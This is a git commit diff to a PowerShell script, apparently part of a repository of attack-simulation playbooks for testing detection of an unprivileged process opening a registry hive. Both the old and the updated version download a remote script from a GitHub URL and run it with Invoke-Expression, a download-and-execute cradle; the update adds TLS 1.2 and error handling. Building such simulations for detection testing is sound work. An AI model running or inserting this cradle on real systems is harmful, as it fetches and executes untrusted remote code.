5367e5db2ee26e7b213f6331acdda6679308991c
Oren Maoz Sharabi <108679419+SilentProcess87@users.noreply.github.com>
2025-01-20 17:26:36 +0200

    Update DownloadandExecute-Me.ps1

--- Playbooks - Unprivileged process opened a registry hive/DownloadandExecute-Me.ps1
+++ Playbooks - Unprivileged process opened a registry hive/DownloadandExecute-Me.ps1
@@ -2,13 +2,23 @@
 # Do not execute it in production or on-premises environments under any circumstances.
 
 # Define the URL where the external script is hosted
-# This example URL points to a remote script. Make sure you understand the implications of downloading and executing remote scripts.
 $url = "https://raw.githubusercontent.com/crtx-pub/PlaybooksAutomation/refs/heads/main/Playbooks%20-%20Unprivileged%20process%20opened%20a%20registry%20hive/HKJOGL.ps1"
 
-# Download and execute the external script
-# The "iex" command evaluates the downloaded script's content as PowerShell code.
-# The "New-Object net.webclient" is used to fetch the script from the URL.
-Invoke-Expression((New-Object net.webclient).DownloadString($url))
+# Ensure TLS 1.2 or higher is used for the connection
+# Older versions of PowerShell default to older, unsupported TLS versions.
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# Invoke a function or command from the downloaded script
-Main-Execute
+# Attempt to download the script
+try {
+    # Download the script as a string
+    $scriptContent = (New-Object System.Net.WebClient).DownloadString($url)
+
+    # Execute the downloaded script
+    Invoke-Expression $scriptContent
+
+    # Invoke a function or command from the downloaded script
+    Main-Execute
+} catch {
+    # Output error details
+    Write-Error "An error occurred while downloading or executing the script: $_"
+}
